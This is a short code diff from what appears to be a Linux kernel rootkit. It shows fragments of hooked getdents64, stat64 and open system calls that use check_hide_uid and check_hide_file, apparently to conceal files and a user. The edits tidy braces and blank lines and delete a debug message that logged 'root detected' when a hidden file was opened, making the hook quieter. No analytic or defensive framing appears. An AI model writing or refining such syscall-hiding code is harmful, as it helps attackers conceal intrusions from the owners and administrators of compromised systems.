@@ -127,9 +127,8 @@ asmlinkage long my_sys_getdents64(unsigned int fd,
 			}
 		}
 		else
-		{
 			prev = cur;
-		}
+
 		ptr += offset;
 	}
 
@@ -181,7 +180,6 @@ long (*orig_sys_stat64) (const char __user * filename, struct stat64 __user * st
 asmlinkage long my_sys_stat64(const char __user * filename, struct stat64 __user * statbuf)
 {
 	int fake = check_hide_uid();
-
 	long res = orig_sys_stat64(filename, statbuf);
 
 	if (fake == 0)
@@ -204,7 +202,6 @@ asmlinkage long my_sys_open(const char __user * filename, int flags, umode_t mod
 
 	if (check_hide_file(filename))
 	{
-		printk("sys_open root detected: %s\n", filename);
 		sys_close(res);
 		return -1;
 	}
